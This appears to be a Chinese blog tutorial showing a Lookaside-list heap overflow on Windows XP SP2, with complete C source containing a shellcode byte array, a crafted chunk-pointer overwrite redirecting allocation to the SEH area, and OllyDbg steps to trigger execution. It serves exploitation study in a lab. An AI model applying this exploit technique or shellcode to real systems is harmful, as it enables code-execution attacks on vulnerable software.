---
layout:		post
title:		利用Lookaside表进行堆溢出
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp2 x86  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 原版OD调试堆时有些问题, 建议用吾爱OD
<!-- more -->


### 0x00 前期准备

新建一个工程, 贴入以下代码

```
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x03\x00\x03\x00\x5C\x01\x08\x99"
"\xE4\xFF\x12\x00"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";


int main(int argc, char* argv[])
{
	HLOCAL h1,h2,h3;
	HANDLE hp;

	hp = HeapCreate(0,0,0);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);

	HeapFree(hp,0,h3);
	HeapFree(hp,0,h2);
	memcpy(h1,shellcode,300);

	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	memcpy(h3,"\x90\x1E\x3A\x00",4);

	int zero = 0;
	zero = 1/zero;
	printf("%d",zero);

	return 0;
}
```

OD附加上去, 单步到完成三次分配

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x00.png)

当释放h3, 快表头指向了h3

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x01.png)

当释放h2, 快表头->h2->h3, 后释放节点会优先链到接近快表头

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x02.png)
![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x03.png)


### 0x01 exploit

执行memcpy覆盖h2的Next指针

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x04.png)

再次请求分配16 byte, 快表优先把靠近快表头的h2分配出去, 造成快表头->0x0012FFE4

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x05.png)

当仔请求分配时, 快表就把0x0012FFE4地址分配出去

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x06.png)

往h3指向地址写入shellcode地址

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x07.png)

触发异常, pwn~

![](/assets/img/exploit/2018-01-01-exploit-by-chunk-lookaside/0x08.png)

当然, 不调试直接运行还是要将基址改成0x00390000